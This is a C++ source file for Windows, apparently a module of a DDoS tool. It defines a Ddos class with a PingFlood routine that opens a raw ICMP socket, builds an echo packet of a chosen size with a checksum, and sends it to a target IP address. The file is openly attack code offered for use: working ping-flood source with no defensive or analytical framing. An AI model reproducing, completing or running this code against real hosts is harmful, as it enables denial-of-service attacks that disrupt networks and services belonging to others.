#include "ddos.h"

void Ddos::Fill_Icmp_Data(char *icmp_data, int datasize)
{
	IcmpHeader *icmp_hdr;
	char *datapart;

	icmp_hdr = (IcmpHeader*)icmp_data;

	icmp_hdr->i_type = ICMP_ECHO;
	icmp_hdr->i_code = 0;
	icmp_hdr->i_id = (USHORT)GetCurrentProcessId();
	icmp_hdr->i_cksum = 0;
	icmp_hdr->i_seq = 0;
  
	datapart = icmp_data + sizeof(IcmpHeader);
	  //
	  // Place some junk in the buffer.
	  //
	memset(datapart,'E', datasize - sizeof(IcmpHeader));
}

USHORT Ddos::Checksum(USHORT * buffer, int size)
{
	unsigned long cksum=0;

	while(size >1) 
	{
		cksum+=*buffer++;
		size -=sizeof(USHORT);
	}
  
	if(size ) 
	{
		cksum += *(UCHAR*)buffer;
	}

	cksum = (cksum >> 16) + (cksum & 0xffff);
	cksum += (cksum >>16);
	return (USHORT)(~cksum);
}

void Ddos::PingFlood(char *ip, int PacketSize)
{
	//int rtrn, n;
	
	int	fromlen = sizeof(from);
	
	WSADATA wsaData;
	WSAStartup(MAKEWORD(2,2), &wsaData);
	
	sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);/*, NULL, 0, 0);*/
	
	/*int	timeout = 390;
	int opter1 = setsockopt( sock, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));
	if (opter1 == 0) {
		//printf(" No error on recv() sockopt \n");
	}
	else {
		if (opter1 == SOCKET_ERROR) {
			printf("ERROR on setopt for rcv() \n");
		}
	}
	
	int opter2 = setsockopt( sock, SOL_SOCKET, SO_SNDTIMEO, (char*)&timeout, sizeof(timeout));
	if (opter2 == 0) {
		//printf(" No error on send() sockopt \n");
	}
	else {
		if (opter2 == SOCKET_ERROR) {
			printf("ERROR on setopt for snd() \n");
		}
	}*/

	memset(&dest, 0, sizeof(dest));
	
	dest.sin_addr.s_addr = inet_addr(ip);
	dest.sin_family = AF_INET;
	
	datasize = PacketSize;
	
	datasize += sizeof(IcmpHeader);  
	
	icmp_data = (char*)xmalloc(MAX_PACKET);
	recvbuf = (char*)xmalloc(MAX_PACKET);
	
	memset(icmp_data,0,MAX_PACKET);
	Fill_Icmp_Data(icmp_data,datasize);
	
	((IcmpHeader*)icmp_data)->i_cksum = 0;
	((IcmpHeader*)icmp_data)->timestamp = GetTickCount();
	
	((IcmpHeader*)icmp_data)->i_seq = seq_no++;
	((IcmpHeader*)icmp_data)->i_cksum = Checksum((USHORT*)icmp_data, 
		datasize);
	
	bwrote = sendto(sock,icmp_data,datasize,0,(struct sockaddr*)&dest, sizeof(dest));
	if (bwrote == SOCKET_ERROR)
	{
		if (WSAGetLastError() == WSAETIMEDOUT)
		{
			//cout << " Time Out \n" << endl;
			//cout << " Bwrote: " << bwrote << endl;
		}
		
		//printf(" sendto failed: %d \n", WSAGetLastError());
	}
	else
	{
		printf("Ddos ping sended: %d\n", bwrote);
	}
	
	xfree(icmp_data);
	xfree(recvbuf);
	closesocket(sock);
}